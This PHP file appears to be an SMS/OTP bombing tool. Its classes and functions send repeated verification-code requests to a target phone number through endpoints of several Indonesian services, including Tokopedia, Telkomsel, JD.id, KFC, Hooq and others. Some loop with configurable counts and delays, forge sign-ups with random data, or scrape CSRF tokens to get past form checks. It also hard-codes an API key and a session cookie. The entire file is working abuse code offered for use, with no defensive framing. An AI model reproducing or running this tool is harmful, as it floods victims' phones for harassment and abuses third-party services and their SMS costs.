<?php
error_reporting(0);

$success = "successfully sent!";
$failure = "failed to send";

/* Tokopedia */

class tokopedia{
	public $target;
  public $type;
	public function sendC($url, $page, $params) {

		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url.$page);
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1);
		}

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';

		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}

  private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$setring = explode($start,$string);
			$setring = explode($end,$setring[1]);
			return $setring[0];
		}
	}
	public function Verif(){
		$url = "https://www.tokocash.com/oauth/otp";
		$target = $this->target;
		$type = $this->type;
		if ($type == 1) {
			$data = "msisdn={$target}&accept=";
		}elseif ($type == 2) {
			$data = "msisdn={$target}&accept=call";
		}
		$send = $this->sendC($url, null, $data);
		// echo $send;
		if (preg_match('/otp_attempt_left/', $send)) {
			print($success);
		} else {
			print($failure);
		}
	}
}

/* PHD */

class phd{
	public $target;
	public function sendC($url, $page, $params) {
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url.$page);
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1);
		}

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';

		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}

	private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$setring = explode($start,$string);
			$setring = explode($end,$setring[1]);
			return $setring[0];
		}
	}

	public function Verif() {
		$url = "https://www.phd.co.id/en/users/sendOTP";
		$target = $this->target;
		$data = "phone_number={$target}";
		$send = $this->sendC($url, null, $data);
		if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $send)) {
			print($success);
		} else {
			print($failure);
		}
	}
}

/* Matahari Mall */

class mataharimall {
  public $target;
  public $email;
  public $pass;
	public function sendC($url, $page, $params) {

    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url.$page);
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

    if(!empty($params)) {
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
      curl_setopt ($ch, CURLOPT_POST, 1);
    }

    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

    $headers  = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'X-Requested-With: XMLHttpRequest';

    curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt ($ch, CURLOPT_HEADER, 1);
    $result = curl_exec ($ch);
    curl_close($ch);
    return $result;
  }

  private function getStr($start, $end, $string) {
    if (!empty($string)) {
      $setring = explode($start,$string);
      $setring = explode($end,$setring[1]);
      return $setring[0];
    }
  }

  public function Login($email,$pass) {
    $url = "https://www.mataharimall.com/user/ajax/login";
    $email = $this->email;
    $pass = $this->pass;
    $data = "email={$email}&passwd={$pass}";
    $send = $this->sendC($url, null, $data);
    if (preg_match('/sukses/', $send)) {
      // print('Login Sukses!<br>');
    } else {
      // print("Login Gagal!<br>");
    }
  }
  public function Verif(){
    $url = "https://www.mataharimall.com/user/ajax/requestotp";
    $target = $this->target;
    $data = "phone_number={$target}";
    $send = $this->sendC($url, null, $data);
    if (preg_match('/Kode OTP berhasil dikirim/', $send)) {
      print($success);
    } else {
      print($failure);
    }
  }
}

/* Jd.id */

function jdid($target, $thread, $delays){
  $x = 0;
  while($x < $thread) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$target."&smsType=1");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    echo $server_output."\n";
    sleep($delays);
    $x++;
    flush();
  }
}

/* Telkomsel */

function telkomsel($target, $thread, $delays){
    $x = 0;
    while($x < $thread) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$target."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($delays);
        $x++;
        flush();
    }
}

/* KFC */

class kfc{
  public $target;
  public function sendC($url, $page, $params) {
    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url.$page);
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19");
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    if(!empty($params)) {
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
      curl_setopt ($ch, CURLOPT_POST, 1);
    }
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    $headers  = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt ($ch, CURLOPT_HEADER, 1);
    $result = curl_exec ($ch);
    curl_close($ch);
    return $result;
  }

  private function getStr($start, $end, $string) {
    if (!empty($string)) {
      $setring = explode($start,$string);
      $setring = explode($end,$setring[1]);
      return $setring[0];
    }
  }

  public function numeric($length = 3){
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
  }

  public function alpha($length = 3){
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
  }

  public function Verif(){
    $url = "https://hd.kfcku.com/prod/api/register";
    $target = $this->target;
    $data = "fullname=makan+ayam&handphone={$target}&email={$this->numeric()}{$this->alpha()}%40gmail.com&password={$this->numeric()}{$this->alpha()}&confirm_password={$this->numeric()}{$this->alpha()}&language_id=ID&X-API-KEY=563f204a20876f1fa0b20523bdfd0728";
    $send = $this->sendC($url, null, $data);
    if (preg_match('/Invalid Handphone Number!/', $send)) {
      print($success);
      flush();
      ob_flush();
      sleep(1);
    } else {
      print($failure);
      flush();
      ob_flush();
      sleep(1);
    }
  }
}

/* ZiPay */

class zipay{
	public $target;
	public function sendC($url, $page, $params) {
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url.$page);
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1);
		}
		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}

	private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$string = explode($start,$string);
			$string = explode($end,$string[1]);
			return $string[0];
		}
	}

	public function Verif(){
		$url = "https://id.zipay.im/invite/signup_sms.aspx";
		$target = $this->target;
		$data = "receiver={$target}";
		$send = $this->sendC($url, null, $data);
		if (preg_match('/true/', $send)) {
			print($success);
			flush();
			ob_flush();
			sleep(1);
		} else {
			print($failure);
			flush();
			ob_flush();
			sleep(1);
		}
	}
}

/* Whiskas */

class whiskas{
  public $target;
	public function sendC($url, $page, $params) {
    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url.$page);
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    if(!empty($params)) {
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
      curl_setopt ($ch, CURLOPT_POST, 1);
    }
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    $headers  = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    $headers[] = 'Cookie: PHPSESSID=a2956063b11be1708aecb0a16af13625; _ga=GA1.2.1113851212.1511884813; _gid=GA1.2.1693517216.1511884813';
    curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt ($ch, CURLOPT_HEADER, 1);
    $result = curl_exec ($ch);
    curl_close($ch);
    return $result;
  }

  private function getStr($start, $end, $string) {
    if (!empty($string)) {
      $string = explode($start,$string);
      $string = explode($end,$string[1]);
      return $string[0];
    }
  }

  public function numeric($length = 4){
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
  }

  public function Verif(){
    $url = "https://id.trywhiskas.com/register/phone";
    $target = $this->target;
    $getcsrf = $this->sendC("https://id.trywhiskas.com/register/", null, null);
    $csrf = $this->getStr('type="hidden" name="','" value="',$getcsrf);
    $key = $this->getStr('" value="','"/>',$getcsrf);
    $data = "userMobileNumber={$target}&{$csrf}={$key}";
    $send = $this->sendC($url, null, $data);
    echo $send;die;
    if (preg_match('/mobileNumber/', $send)) {
      print($success);
      flush();
      ob_flush();
      sleep(61);
    } else {
      print($failure);
      flush();
      ob_flush();
      sleep(61);
    }
  }
}

/* Hooq */

class hooq{
  public $target;
	public function sendC($url, $page, $params) {
    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url.$page);
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    if(!empty($params)) {
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
      curl_setopt ($ch, CURLOPT_POST, 1);
    }
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    $headers  = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt ($ch, CURLOPT_HEADER, 1);
    $result = curl_exec ($ch);
    curl_close($ch);
    return $result;
  }
  private function getStr($start, $end, $string) {
    if (!empty($string)) {
      $string = explode($start,$string);
      $string = explode($end,$string[1]);
      return $string[0];
    }
  }

  public function numeric($length = 4){
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
  }

  public function Verif(){
    $url = "https://www.hooq.tv/signup";
    $target = $this->target;
    $getkey = $this->sendC("https://www.hooq.tv/id/signup", null, null);
    $key = $this->getStr('name="_csrf" value="','" />',$getkey);
    $data = "_csrf={$key}&device_id=56ad6be9-cd02-{$this->numeric()}-{$this->numeric()}-d4f2435ef6e8&country_code=%2B62&mobile={$target}";
    $send = $this->sendC($url, null, $data);
    if (preg_match('/SMS Kode Verifikasi Kamu sudah terkirim ke/', $send)) {
      print($success);
      flush();
      ob_flush();
      sleep(1);
    } else {
      print($failure);
      flush();
      ob_flush();
      sleep(1);
    }
  }
}
